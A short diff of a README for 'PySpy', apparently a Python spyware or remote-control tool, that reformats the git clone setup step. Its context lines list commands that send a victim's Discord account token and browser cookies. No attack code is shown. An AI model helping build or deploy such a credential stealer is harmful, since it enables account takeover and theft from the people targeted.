@@ -21,6 +21,7 @@ This project is intended for educational purposes only. The author is not respon
 - !discord - Sends Discord account info and token
 - !cookies - Sends browser cookies (WIP)
 ## Setup
-1. Clone the repository
-   ```git clone https://github.com/LunarrBlue/PySpy.git
-   cd PySpy```
+1. Clone the repository```
+   git clone https://github.com/LunarrBlue/PySpy.git
+   cd PySpy
+   ```
